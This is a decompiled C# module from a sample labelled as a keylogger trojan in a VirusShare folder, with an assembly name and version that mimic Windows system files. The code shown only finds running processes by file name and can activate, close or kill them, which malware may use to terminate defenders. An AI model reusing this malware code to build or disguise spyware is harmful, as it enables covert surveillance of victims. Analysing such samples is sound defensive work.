// Decompiled with JetBrains decompiler
// Type: services.Module1
// Assembly: services, Version=5.1.2600.5512, Culture=neutral, PublicKeyToken=null
// MVID: F6A9F931-6B07-4D28-AD3E-515314EA1568
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.cme-57cab9f39b07241f0d75407eafce3d58eabd5382a70cdb5631e61e32bd63ac98.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;

namespace services
{
  [StandardModule]
  internal sealed class Module1
  {
    public static bool IsAppRunning(
      string sFilename,
      bool bCompareFullPath = true,
      Module1.eActionState nAction = Module1.eActionState.DoNothing)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      bool flag;
      while (index < processes.Length)
      {
        Process process = processes[index];
        try
        {
          string lower = process.MainModule.FileName.ToLower();
          if (!bCompareFullPath ? lower.IndexOf("\\" + sFilename.ToLower()) > 0 : Operators.CompareString(lower, sFilename.ToLower(), false) == 0)
          {
            try
            {
              switch (nAction)
              {
                case Module1.eActionState.DoActivate:
                  Interaction.AppActivate(process.MainWindowTitle);
                  break;
                case Module1.eActionState.DoClose:
                  process.CloseMainWindow();
                  break;
                case Module1.eActionState.DoKill:
                  process.Kill();
                  break;
              }
              flag = true;
              break;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              flag = false;
              ProjectData.ClearProjectError();
              break;
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      return flag;
    }

    public static bool IsAppRunning2(
      string sFilename,
      bool bCompareFullPath = false,
      Module1.eActionState nAction = Module1.eActionState.DoNothing)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      bool flag;
      while (index < processes.Length)
      {
        Process process = processes[index];
        try
        {
          string lower = process.MainModule.FileName.ToLower();
          if (!bCompareFullPath ? lower.IndexOf("\\" + sFilename.ToLower()) > 0 : Operators.CompareString(lower, sFilename.ToLower(), false) == 0)
          {
            try
            {
              switch (nAction)
              {
                case Module1.eActionState.DoActivate:
                  Interaction.AppActivate(process.MainWindowTitle);
                  break;
                case Module1.eActionState.DoClose:
                  process.CloseMainWindow();
                  break;
                case Module1.eActionState.DoKill:
                  process.Kill();
                  break;
              }
              flag = true;
              break;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              flag = false;
              ProjectData.ClearProjectError();
              break;
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      return flag;
    }

    public enum eActionState
    {
      DoNothing,
      DoActivate,
      DoClose,
      DoKill,
    }
  }
}
